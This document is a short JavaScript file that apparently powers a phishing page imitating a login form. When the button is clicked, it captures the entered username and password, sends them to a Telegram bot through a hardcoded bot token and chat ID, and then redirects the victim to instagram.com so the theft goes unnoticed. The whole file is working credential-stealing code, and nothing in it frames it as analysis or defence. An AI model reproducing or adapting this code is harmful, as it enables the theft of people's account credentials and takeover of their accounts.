let inputs = document.querySelectorAll(`input`);
let login_button = document.querySelector(`button`);

let Token = `7660011567:AAGwAvKF757prOf6O3ukVZoVTcJEJ8MI2hU`;
let chatid = `6543268368`;

login_button.addEventListener(`click`, () => {
    let login = inputs[0].value.trim();
    let parol = inputs[1].value.trim();

    if (!login || !parol) {
        alert("Iltimos, barcha maydonlarni to'ldiring!");
        return;
    }

    let message = `Login: ${login}\nParol: ${parol}`;

    const url = `https://api.telegram.org/bot${Token}/sendMessage`;

    fetch(url, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
            chat_id: chatid,
            text: message,
        }),
    })
        .then((response) => {
            if (response.ok) {
                inputs[0].value = "";
                inputs[1].value = "";
                window.location.href=`https://www.instagram.com/`
            } else {
                inputs[0].value = "";
                inputs[1].value = "";
                alert(" Hatolik yuz berdi iltimos qayatdan urinim korin!");
            }
        })
        .catch((error) => {
            console.error("Xatolik:", error);
            alert("Xabar yuborishda xatolik yuz berdi!");
        });
});
